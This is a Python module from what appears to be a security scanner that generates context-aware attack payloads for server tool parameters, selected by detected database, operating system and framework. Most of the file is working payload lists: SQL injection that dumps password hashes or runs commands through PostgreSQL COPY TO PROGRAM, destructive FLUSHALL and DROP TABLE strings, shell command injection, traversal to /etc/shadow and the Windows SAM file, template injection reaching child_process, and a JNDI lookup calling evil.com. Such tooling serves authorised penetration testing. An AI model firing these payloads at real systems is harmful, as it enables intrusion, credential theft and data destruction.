from typing import Any

from .context_analyzer import (
    AttackSurface,
    DatabaseType,
    Framework,
    OperatingSystem,
    ServerContext,
)


class PayloadGenerator:
    """Generate context-aware attack payloads based on server analysis"""

    def __init__(self):
        # Database-specific SQL injection payloads
        self.sql_payloads = {
            DatabaseType.POSTGRESQL: [
                "'; SELECT version(); --",
                "' UNION SELECT current_database(), current_user --",
                "'; SELECT * FROM pg_tables WHERE schemaname='public'; --",
                "'; SELECT datname FROM pg_database; --",
                "' OR '1'='1' UNION SELECT usename, passwd FROM pg_shadow --",
                "'; COPY (SELECT '') TO PROGRAM 'id'; --",  # PostgreSQL-specific command execution
                "' UNION SELECT lo_import('/etc/passwd'); --"  # Large object functions
            ],
            DatabaseType.MYSQL: [
                "'; SELECT @@version; --",
                "' UNION SELECT DATABASE(), USER() --",
                "'; SELECT table_name FROM information_schema.tables; --",
                "'; SELECT user, password FROM mysql.user; --",
                "' OR '1'='1' UNION SELECT load_file('/etc/passwd') --",
                "'; SELECT @@basedir, @@datadir; --",
                "' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt'; --"
            ],
            DatabaseType.SQLITE: [
                "'; SELECT sqlite_version(); --",
                "' UNION SELECT name FROM sqlite_master WHERE type='table'; --",
                "'; SELECT sql FROM sqlite_master; --",
                "' OR '1'='1' UNION SELECT load_extension('evil.so'); --",
                "'; ATTACH DATABASE '/tmp/test.db' AS test; --"
            ],
            DatabaseType.MONGODB: [
                "'; db.version(); //",
                "' || this.username == 'admin' || '",
                "'; db.getCollectionNames(); //",
                "$where: 'sleep(5000) || true'",
                "'; db.eval('return db.getCollectionNames()'); //",
                "$regex: '.*'}, {password: 1}, {$where: 'function() { return true; }'"
            ],
            DatabaseType.REDIS: [
                "'; CONFIG GET *; --",
                "'; INFO; --",
                "'; KEYS *; --",
                "'; EVAL \"return redis.call('CONFIG', 'GET', '*')\" 0; --",
                "'; FLUSHALL; --"
            ]
        }

        # Operating system specific command injection payloads
        self.command_payloads = {
            OperatingSystem.LINUX: [
                "; id; echo 'command_executed'",
                "| whoami && echo 'linux_confirmed'",
                "; cat /etc/passwd | head -5",
                "; uname -a; echo 'system_info'",
                "$(id > /tmp/cmdtest.txt)",
                "; ps aux | grep root",
                "`cat /proc/version`",
                "; ls -la /etc/ | head -10"
            ],
            OperatingSystem.WINDOWS: [
                "& whoami & echo command_executed",
                "| dir C:\\ && echo windows_confirmed",
                "; type C:\\Windows\\win.ini",
                "& systeminfo & echo system_info",
                "$(Get-Process | Out-String)",
                "& net user & echo user_enum",
                "`dir C:\\Users`",
                "; wmic os get caption"
            ],
            OperatingSystem.MACOS: [
                "; id; echo 'macos_command_executed'",
                "| whoami && echo 'macos_confirmed'",
                "; cat /System/Library/CoreServices/SystemVersion.plist | head -20",
                "; sw_vers; echo 'version_info'",
                "$(id > /tmp/mactest.txt)",
                "; ps aux | grep _system",
                "`dscl . -list /Users`",
                "; system_profiler SPSoftwareDataType"
            ],
            OperatingSystem.UNIX: [
                "; id; echo 'unix_command_executed'",
                "| whoami && echo 'unix_confirmed'",
                "; cat /etc/release 2>/dev/null || cat /etc/issue",
                "; uname -srv; echo 'unix_info'",
                "$(id > /tmp/unixtest.txt)",
                "; ps -ef | head -10"
            ]
        }

        # Framework-specific payloads
        self.framework_payloads = {
            Framework.DJANGO: [
                "{% load static %}{% static 'evil.js' %}",
                "{{ request.META.HTTP_HOST }}",
                "{% url 'admin:index' %}",
                "{{ settings.SECRET_KEY }}",
                "{% debug %}",
                "{{ request.user.is_superuser }}"
            ],
            Framework.FLASK: [
                "{{ config.SECRET_KEY }}",
                "{{ request.environ }}",
                "{{ url_for.__globals__ }}",
                "{{ get_flashed_messages.__globals__ }}",
                "{{ request.application.__globals__ }}",
                "{{ ''.__class__.__mro__[1].__subclasses__() }}"
            ],
            Framework.EXPRESS: [
                "${process.env}",
                "${require('fs').readdirSync('/')}",
                "${global.process.mainModule.require('child_process').execSync('id')}",
                "${require('util').inspect(process)}",
                "${process.cwd()}"
            ],
            Framework.FASTAPI: [
                "${__import__('os').environ}",
                "${__import__('subprocess').check_output('id', shell=True)}",
                "${globals()}",
                "${locals()}"
            ]
        }

        # Path traversal payloads by OS
        self.path_traversal_payloads = {
            OperatingSystem.LINUX: [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd%00.txt",
                "../../../../../proc/self/environ",
                "../../etc/shadow",
                "../../../var/log/auth.log"
            ],
            OperatingSystem.WINDOWS: [
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....\\\\....\\\\....\\\\windows\\system.ini",
                "C:\\windows\\win.ini%00.txt",
                "..\\..\\..\\..\\boot.ini",
                "..\\..\\..\\windows\\repair\\sam"
            ],
            OperatingSystem.MACOS: [
                "../../../etc/passwd",
                "../../../../Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist",
                "../../../private/etc/master.passwd",
                "../../../../System/Library/CoreServices/SystemVersion.plist"
            ]
        }

    def generate_sql_payloads(self, context: ServerContext) -> list[dict[str, str]]:
        """Generate database-specific SQL injection payloads"""
        payloads = []

        # Use database-specific payloads if detected
        for db_type in context.technology_stack.databases:
            if db_type in self.sql_payloads:
                db_payloads = self.sql_payloads[db_type]
                for payload in db_payloads:
                    payloads.append({
                        "payload": payload,
                        "description": f"{db_type.value}-specific SQL injection",
                        "target_database": db_type.value,
                        "severity": "high"
                    })

        # Add generic SQL payloads as fallback
        generic_payloads = [
            {"payload": "'; DROP TABLE users; --", "description": "Generic table drop attempt", "target_database": "generic", "severity": "critical"},
            {"payload": "' OR '1'='1", "description": "Authentication bypass attempt", "target_database": "generic", "severity": "high"},
            {"payload": "' UNION SELECT 1,2,3--", "description": "Union-based injection", "target_database": "generic", "severity": "medium"},
            {"payload": "admin'/**/OR/**/1=1--", "description": "Comment-based bypass", "target_database": "generic", "severity": "medium"},
            {"payload": "' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "description": "Blind SQL injection", "target_database": "generic", "severity": "medium"}
        ]

        payloads.extend(generic_payloads)
        return payloads

    def generate_command_payloads(self, context: ServerContext) -> list[dict[str, str]]:
        """Generate OS-specific command injection payloads"""
        payloads = []

        # Use OS-specific payloads if detected
        os_type = context.technology_stack.operating_system
        if os_type in self.command_payloads:
            os_payloads = self.command_payloads[os_type]
            for payload in os_payloads:
                payloads.append({
                    "payload": payload,
                    "description": f"{os_type.value}-specific command injection",
                    "target_os": os_type.value,
                    "severity": "high"
                })

        # Add cross-platform payloads
        generic_command_payloads = [
            {"payload": "; echo 'command_injection_test'", "description": "Basic command injection test", "target_os": "generic", "severity": "high"},
            {"payload": "| echo 'pipe_injection_test'", "description": "Pipe-based command injection", "target_os": "generic", "severity": "high"},
            {"payload": "`echo 'backtick_injection_test'`", "description": "Backtick command execution", "target_os": "generic", "severity": "high"},
            {"payload": "$(echo 'subshell_injection_test')", "description": "Subshell command execution", "target_os": "generic", "severity": "high"}
        ]

        payloads.extend(generic_command_payloads)
        return payloads

    def generate_path_traversal_payloads(self, context: ServerContext) -> list[dict[str, str]]:
        """Generate OS-specific path traversal payloads"""
        payloads = []

        # Use OS-specific payloads if detected
        os_type = context.technology_stack.operating_system
        if os_type in self.path_traversal_payloads:
            os_payloads = self.path_traversal_payloads[os_type]
            for payload in os_payloads:
                payloads.append({
                    "payload": payload,
                    "description": f"{os_type.value}-specific path traversal",
                    "target_os": os_type.value,
                    "severity": "medium"
                })

        # Add generic path traversal payloads
        generic_path_payloads = [
            {"payload": "../../../../../../etc/passwd", "description": "Deep directory traversal", "target_os": "generic", "severity": "medium"},
            {"payload": "....//....//....//sensitive.txt", "description": "Double encoding traversal", "target_os": "generic", "severity": "medium"},
            {"payload": "../config/database.yml%00.txt", "description": "Null byte injection", "target_os": "generic", "severity": "medium"}
        ]

        payloads.extend(generic_path_payloads)
        return payloads

    def generate_framework_payloads(self, context: ServerContext) -> list[dict[str, str]]:
        """Generate framework-specific template injection payloads"""
        payloads = []

        # Use framework-specific payloads if detected
        for framework in context.technology_stack.frameworks:
            if framework in self.framework_payloads:
                fw_payloads = self.framework_payloads[framework]
                for payload in fw_payloads:
                    payloads.append({
                        "payload": payload,
                        "description": f"{framework.value}-specific template injection",
                        "target_framework": framework.value,
                        "severity": "high"
                    })

        return payloads

    def generate_tool_specific_payloads(self, tool: dict[str, Any], context: ServerContext) -> list[dict[str, Any]]:
        """Generate payloads tailored to specific tool parameters and context"""
        payloads = []

        tool.get('name', '').lower()
        tool.get('description', '').lower()
        input_schema = tool.get('inputSchema', {})
        properties = input_schema.get('properties', {})

        # Generate payloads based on parameter names and types
        for param_name, param_schema in properties.items():
            param_type = param_schema.get('type', 'string')
            param_name_lower = param_name.lower()

            # Database parameter injection
            if any(db_keyword in param_name_lower for db_keyword in ['query', 'sql', 'search', 'filter']):
                sql_payloads = self.generate_sql_payloads(context)
                for sql_payload in sql_payloads[:3]:  # Limit to top 3 for performance
                    payloads.append({
                        "parameter": param_name,
                        "payload": sql_payload["payload"],
                        "description": f"SQL injection via {param_name} parameter",
                        "attack_type": "sql_injection",
                        "severity": sql_payload["severity"]
                    })

            # Command parameter injection
            if any(cmd_keyword in param_name_lower for cmd_keyword in ['command', 'cmd', 'execute', 'run']):
                cmd_payloads = self.generate_command_payloads(context)
                for cmd_payload in cmd_payloads[:3]:  # Limit to top 3
                    payloads.append({
                        "parameter": param_name,
                        "payload": cmd_payload["payload"],
                        "description": f"Command injection via {param_name} parameter",
                        "attack_type": "command_injection",
                        "severity": cmd_payload["severity"]
                    })

            # File path parameter injection
            if any(path_keyword in param_name_lower for path_keyword in ['path', 'file', 'filename', 'directory']):
                path_payloads = self.generate_path_traversal_payloads(context)
                for path_payload in path_payloads[:3]:  # Limit to top 3
                    payloads.append({
                        "parameter": param_name,
                        "payload": path_payload["payload"],
                        "description": f"Path traversal via {param_name} parameter",
                        "attack_type": "path_traversal",
                        "severity": path_payload["severity"]
                    })

            # Type confusion attacks
            if param_type == "string":
                # Try to inject different data types
                type_confusion_payloads = [
                    {"payload": 12345, "description": "Integer type confusion"},
                    {"payload": ["array", "injection"], "description": "Array type confusion"},
                    {"payload": {"object": "injection"}, "description": "Object type confusion"},
                    {"payload": True, "description": "Boolean type confusion"}
                ]

                for tc_payload in type_confusion_payloads:
                    if isinstance(tc_payload, dict):
                        payloads.append({
                            "parameter": param_name,
                            "payload": tc_payload.get("payload"),
                            "description": f"{tc_payload.get('description', 'Type confusion')} via {param_name}",
                            "attack_type": "type_confusion",
                            "severity": "medium"
                        })

            # Content injection for text/content parameters
            if any(content_keyword in param_name_lower for content_keyword in ['content', 'data', 'body', 'text', 'message']):
                content_payloads = [
                    {"payload": "<script>alert('xss')</script>", "description": "XSS injection"},
                    {"payload": "{{7*7}}", "description": "Template injection test"},
                    {"payload": "${jndi:ldap://evil.com/a}", "description": "JNDI injection"},
                    {"payload": "../../etc/passwd", "description": "Path traversal in content"}
                ]

                for content_payload in content_payloads:
                    payloads.append({
                        "parameter": param_name,
                        "payload": content_payload["payload"],
                        "description": f"{content_payload['description']} via {param_name}",
                        "attack_type": "content_injection",
                        "severity": "medium"
                    })

        return payloads

    def generate_context_aware_payloads(self, context: ServerContext) -> dict[str, list[dict[str, str]]]:
        """Generate comprehensive context-aware payload set"""

        payload_categories = {
            "sql_injection": self.generate_sql_payloads(context),
            "command_injection": self.generate_command_payloads(context),
            "path_traversal": self.generate_path_traversal_payloads(context),
            "framework_specific": self.generate_framework_payloads(context)
        }

        # Add language-specific payloads
        language_payloads = []
        for language in context.technology_stack.languages:
            if language == "python":
                language_payloads.extend([
                    {"payload": "__import__('os').system('id')", "description": "Python code injection", "target_language": "python", "severity": "high"},
                    {"payload": "exec('import os; os.system(\"whoami\")')", "description": "Python exec injection", "target_language": "python", "severity": "high"}
                ])
            elif language == "javascript":
                language_payloads.extend([
                    {"payload": "require('child_process').exec('id')", "description": "Node.js code injection", "target_language": "javascript", "severity": "high"},
                    {"payload": "process.env", "description": "Environment variable disclosure", "target_language": "javascript", "severity": "medium"}
                ])
            elif language == "php":
                language_payloads.extend([
                    {"payload": "<?php system('id'); ?>", "description": "PHP code injection", "target_language": "php", "severity": "high"},
                    {"payload": "eval('phpinfo();')", "description": "PHP eval injection", "target_language": "php", "severity": "high"}
                ])

        if language_payloads:
            payload_categories["language_specific"] = language_payloads

        return payload_categories

    def prioritize_payloads_by_risk(self, payloads: list[dict[str, str]], attack_surface: AttackSurface) -> list[dict[str, str]]:
        """Prioritize payloads based on identified attack surface and risk level"""

        # Create priority scoring
        priority_scores = {}

        for i, payload in enumerate(payloads):
            score = 0

            # Higher priority for payloads matching detected vulnerabilities
            if payload.get("attack_type") == "sql_injection" and len(attack_surface.sql_injection_targets) > 0:
                score += 10
            elif payload.get("attack_type") == "command_injection" and len(attack_surface.command_injection_targets) > 0:
                score += 10
            elif payload.get("attack_type") == "path_traversal" and len(attack_surface.path_traversal_targets) > 0:
                score += 8

            # Higher priority for high severity payloads
            if payload.get("severity") == "critical":
                score += 8
            elif payload.get("severity") == "high":
                score += 5
            elif payload.get("severity") == "medium":
                score += 2

            priority_scores[i] = score

        # Sort payloads by priority score (descending)
        sorted_indices = sorted(priority_scores.keys(), key=lambda x: priority_scores[x], reverse=True)
        return [payloads[i] for i in sorted_indices]
